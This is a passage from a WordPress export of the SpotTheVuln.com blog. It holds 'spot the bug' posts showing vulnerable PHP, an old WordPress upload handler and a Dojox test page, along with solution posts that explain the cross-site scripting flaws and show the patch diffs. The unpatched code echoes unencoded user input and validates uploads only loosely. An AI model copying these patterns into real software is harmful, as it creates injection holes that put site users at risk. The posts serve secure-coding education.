		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="information"><![CDATA[Information]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#contest #free_stuff]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/bC5uE1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[527669c7da61972c73467f8f9ddec7ad]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>764</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention Information Vulnerability Code Example ~SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2010/09/one-year-anniversary/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2010-09-20 23:25:46</wp:comment_date>
			<wp:comment_date_gmt>2010-09-21 06:25:46</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by Brett Hardin and Barry Irwin, Spot The Vuln. Spot The Vuln said: New Post: One-Year Anniversary http://bit.ly/cDBlqL #contest #free_stuff [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Noble</title>
		<link>http://spotthevuln.com/2010/09/noble/</link>
		<pubDate>Mon, 20 Sep 2010 15:00:36 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1114</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>I'm sorry my existence is not very noble or sublime.</strong><strong>
</strong> <strong> -Keanu Reeves</strong></blockquote>
[ccnLe_php]
&lt;?php //Makes sure they choose a file

//print_r($HTTP_POST_FILES);
//die();


$imgalt = (isset($_POST['imgalt'])) ? $_POST['imgalt'] : $imgalt;

$img1_name = (strlen($imgalt)) ? $_POST['imgalt'] : $HTTP_POST_FILES['img1']['name'];
$img1_type = (strlen($imgalt)) ? $_POST['img1_type'] : $HTTP_POST_FILES['img1']['type'];
$imgdesc = str_replace('"', '&amp;amp;quot;', $_POST['imgdesc']);

$imgtype = explode(".",$img1_name);
$imgtype = strtolower($imgtype[count($imgtype)-1]);

if (in_array($imgtype, $allowed_types) == false) {
die(sprintf(__('File %1$s of type %2$s is not allowed.') , $img1_name, $imgtype));
}

if (strlen($imgalt)) {
$pathtofile = get_settings('fileupload_realpath')."/".$imgalt;
$img1 = $_POST['img1'];
} else {
$pathtofile = get_settings('fileupload_realpath')."/".$img1_name;
$img1 = $HTTP_POST_FILES['img1']['tmp_name'];
}

// makes sure not to upload duplicates, rename duplicates
$i = 1;
$pathtofile2 = $pathtofile;
$tmppathtofile = $pathtofile2;
$img2_name = $img1_name;

while (file_exists($pathtofile2)) {
$pos = strpos($tmppathtofile, '.'.trim($imgtype));
$pathtofile_start = substr($tmppathtofile, 0, $pos);
$pathtofile2 = $pathtofile_start.'_'.zeroise($i++, 2).'.'.trim($imgtype);
$img2_name = explode('/', $pathtofile2);
$img2_name = $img2_name[count($img2_name)-1];
}

if (file_exists($pathtofile) &amp;&amp; !strlen($imgalt)) {
$i = explode(' ', get_settings('fileupload_allowedtypes'));
$i = implode(', ',array_slice($i, 1, count($i)-2));
$moved = move_uploaded_file($img1, $pathtofile2);
// if move_uploaded_file() fails, try copy()
if (!$moved) {
$moved = copy($img1, $pathtofile2);
}
if (!$moved) {
die(sprintf(__("Couldn't upload your file to %s."), $pathtofile2));
} else {
chmod($pathtofile2, 0666);
@unlink($img1);
}

//

// duplicate-renaming function contributed by Gary Lawrence Murphy
?&gt;
&lt;p&gt;&lt;strong&gt;&lt;?php __('Duplicate File?') ?&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;&lt;em&gt;&lt;?php printf(__("The filename '%s' already exists!"), $img1_name); ?&gt;&lt;/em&gt;&lt;/b&gt;&lt;/p&gt;
&lt;p&gt; &lt;?php printf(__("Filename '%1\$s' moved to '%2\$s'"), $img1, "$pathtofile2 - $img2_name") ?&gt;&lt;/p&gt;
&lt;p&gt;&lt;?php _e('Confirm or rename:') ?&gt;&lt;/p&gt;
&lt;form action="upload.php" method="post" enctype="multipart/form-data"&gt;
&lt;input type="hidden" name="MAX_FILE_SIZE" value="&lt;?php echo  get_settings('fileupload_maxk') *1024 ?&gt;" /&gt;
&lt;input type="hidden" name="img1_type" value="&lt;?php echo $img1_type;?&gt;" /&gt;
&lt;input type="hidden" name="img1_name" value="&lt;?php echo $img2_name;?&gt;" /&gt;
&lt;input type="hidden" name="img1_size" value="&lt;?php echo $img1_size;?&gt;" /&gt;
&lt;input type="hidden" name="img1" value="&lt;?php echo $pathtofile2;?&gt;" /&gt;
&lt;input type="hidden" name="thumbsize" value="&lt;?php echo $_REQUEST['thumbsize'];?&gt;" /&gt;
&lt;input type="hidden" name="imgthumbsizecustom" value="&lt;?php echo $_REQUEST['imgthumbsizecustom'];?&gt;" /&gt;
&lt;?php _e('Alternate name:') ?&gt;&lt;br /&gt;&lt;input type="text" name="imgalt" size="30" value="&lt;?php echo $img2_name;?&gt;" /&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;?php _e('Description:') ?&gt;&lt;br /&gt;&lt;input type="text" name="imgdesc" size="30" value="&lt;?php echo $imgdesc;?&gt;" /&gt;
&lt;br /&gt;
&lt;input type="submit" name="submit" value="&lt;?php _e('Rename') ?&gt;" /&gt;
&lt;/form&gt;
&lt;/div&gt;
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1114</wp:post_id>
		<wp:post_date>2010-09-20 08:00:36</wp:post_date>
		<wp:post_date_gmt>2010-09-20 15:00:36</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>noble</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cFmZD0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[c0fff928ab1460f166c7311842596c10]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>762</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention Code Snippet Vulnerability Code Example ~SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2010/09/noble/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2010-09-20 09:30:44</wp:comment_date>
			<wp:comment_date_gmt>2010-09-20 16:30:44</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by Ryan Dewhurst, Spot The Vuln. Spot The Vuln said: New Post: Noble http://bit.ly/cFmZD0 #secure #code #dev [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>773</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Solution, Wordpress Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/09/noble-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-09-24 08:06:11</wp:comment_date>
			<wp:comment_date_gmt>2010-09-24 15:06:11</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Noble [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Noble - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/09/noble-cross-site-scripting/</link>
		<pubDate>Fri, 24 Sep 2010 15:00:01 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1118</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: WordPress (core)

Fixed in Version: 1.2

Issue Type: XSS

Original Code: <a title="Noble" href="http://spotthevuln.com/2010/09/noble/" target="_blank">Found    Here</a>
<h2>Description</h2>
Looking at this code made me smile, its about 6 years old.  There’s a lot going on here and quite a few issues.  The first thing that jumped out at me was the use of $HTTP_POST_FILES.  $HTTP_POST_FILES means were working with user controlled files.  There are tons of things that can go wrong when dealing with user/attacker controlled files (a list too long to go into here).  Lets hope the WordPress devs are on their A-game here.  Looking at the patch submitted by the WordPress developers, we see that they changed references to $HTTP_POST_FILES to the superglobal $_FILES.  Within the $_FILES array there are a couple indexes that are commonly used.  These indexes are:
<blockquote>[name]
[type]
[tmp_name]
[error]
[size]</blockquote>
Name, type, and size are all controlled by the user/attacker, so the WordPress developers should be wary when dealing with these values.  Surprisingly (or unsurprisingly, depending on your point of view), this patch doesn’t contain seem to contain any robust validation of data associated with the uploaded file data.  Instead, the defenses put in place here seem to be centered around replacing a poor validation/sanitization routine with a more robust encoding routine which prevents a XSS vulnerability.  The replaced sanitization routine and the XSS bug are presented in the following lines:
<blockquote><span style="color: #ff0000;">-$imgdesc = str_replace('"', '&amp;amp;quot;', $_POST['imgdesc']);</span><span style="color: #00ff00;">
+$imgdesc = htmlentities2($imgdesc);</span>
class="uploadform" value="&lt;?php echo $imgdesc;?&gt;" /&gt;</blockquote>
What’s surprising is although the WordPress developers prevented this single XSS vulnerability, there is a large number of XSS vulnerabilities in this file.  The most obvious symptom is “&lt;?php echo $_REQUEST[] ?&gt;.  Additionally, the loose validation of the user uploaded file is concerning, especially with the number of problems that can be encountered when dealing with user controlled files.  Maybe the varsity team was on vacation when this patch went in.
<h2>Developers Solution</h2>
[cce lang="diff"]
&lt;?php //Makes sure they choose a file

//print_r($HTTP_POST_FILES);
//die();


- $imgalt = (isset($_POST['imgalt'])) ? $_POST['imgalt'] : $imgalt;
-
- $img1_name = (strlen($imgalt)) ? $_POST['imgalt'] : $HTTP_POST_FILES['img1']['name'];
- $img1_type = (strlen($imgalt)) ? $_POST['img1_type'] : $HTTP_POST_FILES['img1']['type'];
- $imgdesc = str_replace('"', '&amp;amp;quot;', $_POST['imgdesc']);
+$imgalt = basename( (isset($_POST['imgalt'])) ? $_POST['imgalt'] : '' );
+
+$img1_name = (strlen($imgalt)) ? $imgalt : basename( $_FILES['img1']['name'] );
+$img1_type = (strlen($imgalt)) ? $_POST['img1_type'] : $_FILES['img1']['type'];
+$imgdesc = htmlentities2($imgdesc);

$imgtype = explode(".",$img1_name);
$imgtype = strtolower($imgtype[count($imgtype)-1]);

if (in_array($imgtype, $allowed_types) == false) {
die(sprintf(__('File %1$s of type %2$s is not allowed.') , $img1_name, $imgtype));
}

if (strlen($imgalt)) {
$pathtofile = get_settings('fileupload_realpath')."/".$imgalt;
-$img1 = $_POST['img1'];
+$img1 = $_POST['img1']['tmp_name'];
} else {
$pathtofile = get_settings('fileupload_realpath')."/".$img1_name;
-$img1 = $HTTP_POST_FILES['img1']['tmp_name'];
+$img1 = $_FILES['img1']['tmp_name'];
}

// makes sure not to upload duplicates, rename duplicates
$i = 1;
$pathtofile2 = $pathtofile;
$tmppathtofile = $pathtofile2;
$img2_name = $img1_name;

while (file_exists($pathtofile2)) {
$pos = strpos($tmppathtofile, '.'.trim($imgtype));
$pathtofile_start = substr($tmppathtofile, 0, $pos);
$pathtofile2 = $pathtofile_start.'_'.zeroise($i++, 2).'.'.trim($imgtype);
$img2_name = explode('/', $pathtofile2);
$img2_name = $img2_name[count($img2_name)-1];
}

if (file_exists($pathtofile) &amp;&amp; !strlen($imgalt)) {
$i = explode(' ', get_settings('fileupload_allowedtypes'));
$i = implode(', ',array_slice($i, 1, count($i)-2));
$moved = move_uploaded_file($img1, $pathtofile2);
// if move_uploaded_file() fails, try copy()
if (!$moved) {
$moved = copy($img1, $pathtofile2);
}
if (!$moved) {
die(sprintf(__("Couldn't upload your file to %s."), $pathtofile2));
} else {
chmod($pathtofile2, 0666);
@unlink($img1);
}

//

// duplicate-renaming function contributed by Gary Lawrence Murphy
?&gt;
&lt;p&gt;&lt;strong&gt;&lt;?php __('Duplicate File?') ?&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;&lt;em&gt;&lt;?php printf(__("The filename '%s' already exists!"), $img1_name); ?&gt;&lt;/em&gt;&lt;/b&gt;&lt;/p&gt;
&lt;p&gt; &lt;?php printf(__("Filename '%1\$s' moved to '%2\$s'"), $img1, "$pathtofile2 - $img2_name") ?&gt;&lt;/p&gt;
&lt;p&gt;&lt;?php _e('Confirm or rename:') ?&gt;&lt;/p&gt;
&lt;form action="upload.php" method="post" enctype="multipart/form-data"&gt;
&lt;input type="hidden" name="MAX_FILE_SIZE" value="&lt;?php echo  get_settings('fileupload_maxk') *1024 ?&gt;" /&gt;
&lt;input type="hidden" name="img1_type" value="&lt;?php echo $img1_type;?&gt;" /&gt;
&lt;input type="hidden" name="img1_name" value="&lt;?php echo $img2_name;?&gt;" /&gt;
&lt;input type="hidden" name="img1_size" value="&lt;?php echo $img1_size;?&gt;" /&gt;
&lt;input type="hidden" name="img1" value="&lt;?php echo $pathtofile2;?&gt;" /&gt;
&lt;input type="hidden" name="thumbsize" value="&lt;?php echo $_REQUEST['thumbsize'];?&gt;" /&gt;
&lt;input type="hidden" name="imgthumbsizecustom" value="&lt;?php echo $_REQUEST['imgthumbsizecustom'];?&gt;" /&gt;
&lt;?php _e('Alternate name:') ?&gt;&lt;br /&gt;&lt;input type="text" name="imgalt" size="30" value="&lt;?php echo $img2_name;?&gt;" /&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;?php _e('Description:') ?&gt;&lt;br /&gt;&lt;input type="text" name="imgdesc" size="30" value="&lt;?php echo $imgdesc;?&gt;" /&gt;
&lt;br /&gt;
&lt;input type="submit" name="submit" value="&lt;?php _e('Rename') ?&gt;" /&gt;
&lt;/form&gt;
&lt;/div&gt;
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1118</wp:post_id>
		<wp:post_date>2010-09-24 08:00:01</wp:post_date>
		<wp:post_date_gmt>2010-09-24 15:00:01</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>noble-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="attacker"><![CDATA[attacker]]></category>
		<category domain="post_tag" nicename="bugs"><![CDATA[bugs]]></category>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php-echo"><![CDATA[php echo]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="vulnerabilities"><![CDATA[vulnerabilities]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/ah7y9S]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[5cd00fb0a086c660713c3692e8861999]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Too Little</title>
		<link>http://spotthevuln.com/2010/09/too-little/</link>
		<pubDate>Mon, 27 Sep 2010 15:00:41 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1121</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Any supervisor worth his salt would rather deal with people who attempt too much than with those who try too little</strong><strong>.
</strong> <strong> -Lee Iacocca</strong></blockquote>
[ccnLe_php]
&lt;?php
// this just bounces a message as a response, and optionally emulates network latency.

// default delay is 0 sec, to change:
// getResponse.php?delay=[Int milliseconds]

// to change the message returned
// getResponse.php?mess=whatever%20string%20you%20want.

// to select a predefined message
// getResponse.php?messId=0

error_reporting(E_ALL ^ E_NOTICE);

$delay = 1; // 1 micro second to avoid zero division in messId 2
if(isset($_GET['delay']) &amp;&amp; is_numeric($_GET['delay'])){
$delay = (intval($_GET['delay']) * 1000);
}

if(isset($_GET['messId']) &amp;&amp; is_numeric($_GET['messId'])){
switch($_GET['messId']){
case 0:
echo "&lt;h3&gt;WARNING This should NEVER be seen, delayed by 2 sec!&lt;/h3&gt;";
$delay = 2;
break;
case 1:
echo "&lt;div dojotype='dijit.TestWidget'&gt;Testing attr('href', ...)&lt;/div&gt;";
break;
case 2:
echo "&lt;div dojotype='dijit.TestWidget'&gt;Delayed attr('href', ...) test&lt;/div&gt;
&lt;div dojotype='dijit.TestWidget'&gt;Delayed by " . ($delay/1000000) . " sec.&lt;/div&gt;";
break;
case 3:
echo "IT WAS the best of times, it was the worst of times, it was the age of wisdom, it was the age of foolishness, it was the epoch of belief, it was the epoch of incredulity, it was the season of Light, it was the season of Darkness, it was the spring of hope, it was the winter of despair, we had everything before us, we had nothing before us, we were all going direct to Heaven, we were all going direct the other way -- in short, the period was so far like the present period, that some of its noisiest authorities insisted on its being received, for good or for evil, in the superlative degree of comparison only";
break;
case 4:
echo "There were a king with a large jaw and a queen with a plain face, on the throne of England; there were a king with a large jaw and a queen with a fair face, on the throne of France. In both countries it was clearer than crystal to the lords of the State preserves of loaves and fishes, that things in general were settled for ever.";
break;
case 5:
echo "It was the year of Our Lord one thousand seven hundred and seventy- five. Spiritual revelations were conceded to England at that favoured period, as at this. Mrs. Southcott had recently attained her five-and- twentieth blessed birthday, of whom a prophetic private in the Life Guards had heralded the sublime appearance by announcing that arrangements were made for the swallowing up of London and Westminster. Even the Cock-lane ghost had been laid only a round dozen of years, after rapping out its messages, as the spirits of this very year last past (supernaturally deficient in originality) rapped out theirs. Mere messages in the earthly order of events had lately come to the English Crown and People, from a congress of British subjects in America:";
break;
default:
echo "unknown messId:{$_GET['messId']}";
}
}

if(isset($_GET['bounceGetStr']) &amp;&amp;  $_GET['bounceGetStr']){
echo "&lt;div id='bouncedGetStr'&gt;{$_SERVER["QUERY_STRING"]}&lt;/div&gt;";
}

if(isset($_GET['message']) &amp;&amp; $_GET['message']){
echo $_GET['message'];
}

usleep($delay);

?&gt;
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1121</wp:post_id>
		<wp:post_date>2010-09-27 08:00:41</wp:post_date>
		<wp:post_date_gmt>2010-09-27 15:00:41</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>too-little</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/9Hjwpg]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[fda39ca78db4fbc1721cc9ce12fe7cd8]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>799</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), DoJo, PHP, Solution Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/10/too-little-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-10-01 08:01:39</wp:comment_date>
			<wp:comment_date_gmt>2010-10-01 15:01:39</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Too Little [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Too Little - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/10/too-little-cross-site-scripting/</link>
		<pubDate>Fri, 01 Oct 2010 15:00:29 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1125</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: Dojox

Fixed in Version: 1.4.1

Issue Type: XSS

Original Code: <a title="Too Little" href="http://spotthevuln.com/2010/09/too-little/" target="_blank">Found    Here</a>
<h2>Description</h2>
The code sample presented this week have a few XSS vulnerabilities.  The first XSS bug is caused when $_GET[‘messId’] doesn’t match any of the switch cases.  The default behavior is to throw a friendly error message indicating the messId is unknown along with the value passed via the querystring.  Unfortunately, the error message can also contain attacker controlled HTML/SCRIPT resulting in XSS.  The two other XSS bugs fixed by the developers in this patch are classic XSS.  Both issues take user/attacker controlled variables and display the variables in markup without sanitization/encoding.

Although the XSS bugs are fairly straight forward, what I find interesting in this example is why this page is here in the first place.  The code don’t seem to provide any useful functionality (other than to provide a place for attackers to abuse XSS).  If you were a security engineer assigned to audit this page, it might be a good idea to ask WHY this page exists in the first place.  It turns out that this page is indeed a test/debugging page that is included with dojox, offering no functionality intended for production users.  Think long and hard before exposing test and debug functionality in your production environment.  Check production systems for example/testing/debugging functionality and disable/remove this functionality if possible.  Code developed for testing and debugging rarely undergoes the scrutiny of production code and will like contain security issues.
<h2>Developers Solution</h2>
[cce lang="diff"]
&lt;?php
// this just bounces a message as a response, and optionally emulates network latency.

// default delay is 0 sec, to change:
// getResponse.php?delay=[Int milliseconds]

// to change the message returned
// getResponse.php?mess=whatever%20string%20you%20want.

// to select a predefined message
// getResponse.php?messId=0

error_reporting(E_ALL ^ E_NOTICE);

$delay = 1; // 1 micro second to avoid zero division in messId 2
if(isset($_GET['delay']) &amp;&amp; is_numeric($_GET['delay'])){
$delay = (intval($_GET['delay']) * 1000);
}

if(isset($_GET['messId']) &amp;&amp; is_numeric($_GET['messId'])){
switch($_GET['messId']){
case 0:
echo "&lt;h3&gt;WARNING This should NEVER be seen, delayed by 2 sec!&lt;/h3&gt;";
$delay = 2;
break;
case 1:
echo "&lt;div dojotype='dijit.TestWidget'&gt;Testing attr('href', ...)&lt;/div&gt;";
break;
case 2:
echo "&lt;div dojotype='dijit.TestWidget'&gt;Delayed attr('href', ...) test&lt;/div&gt;
&lt;div dojotype='dijit.TestWidget'&gt;Delayed by " . ($delay/1000000) . " sec.&lt;/div&gt;";
break;
case 3:
echo "IT WAS the best of times, it was the worst of times, it was the age of wisdom, it was the age of foolishness, it was the epoch of belief, it was the epoch of incredulity, it was the season of Light, it was the season of Darkness, it was the spring of hope, it was the winter of despair, we had everything before us, we had nothing before us, we were all going direct to Heaven, we were all going direct the other way -- in short, the period was so far like the present period, that some of its noisiest authorities insisted on its being received, for good or for evil, in the superlative degree of comparison only";
break;
case 4:
echo "There were a king with a large jaw and a queen with a plain face, on the throne of England; there were a king with a large jaw and a queen with a fair face, on the throne of France. In both countries it was clearer than crystal to the lords of the State preserves of loaves and fishes, that things in general were settled for ever.";
break;
case 5:
echo "It was the year of Our Lord one thousand seven hundred and seventy- five. Spiritual revelations were conceded to England at that favoured period, as at this. Mrs. Southcott had recently attained her five-and- twentieth blessed birthday, of whom a prophetic private in the Life Guards had heralded the sublime appearance by announcing that arrangements were made for the swallowing up of London and Westminster. Even the Cock-lane ghost had been laid only a round dozen of years, after rapping out its messages, as the spirits of this very year last past (supernaturally deficient in originality) rapped out theirs. Mere messages in the earthly order of events had lately come to the English Crown and People, from a congress of British subjects in America:";
break;
default:
-echo "unknown messId:{$_GET['messId']}";
+echo "unknown messId:". htmlentities($_GET['messId']);
}
}

if(isset($_GET['bounceGetStr']) &amp;&amp;  $_GET['bounceGetStr']){
-echo "&lt;div id='bouncedGetStr'&gt;{$_SERVER["QUERY_STRING"]}&lt;/div&gt;";
+echo "&lt;div id='bouncedGetStr'&gt;".htmlentities($_SERVER["QUERY_STRING"])."&lt;/div&gt;";
}

if(isset($_GET['message']) &amp;&amp; $_GET['message']){
-echo $_GET['message'];
+echo htmlentities($_GET['message']);
}

usleep($delay);

?&gt;

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1125</wp:post_id>
		<wp:post_date>2010-10-01 08:00:29</wp:post_date>
		<wp:post_date_gmt>2010-10-01 15:00:29</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>too-little-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
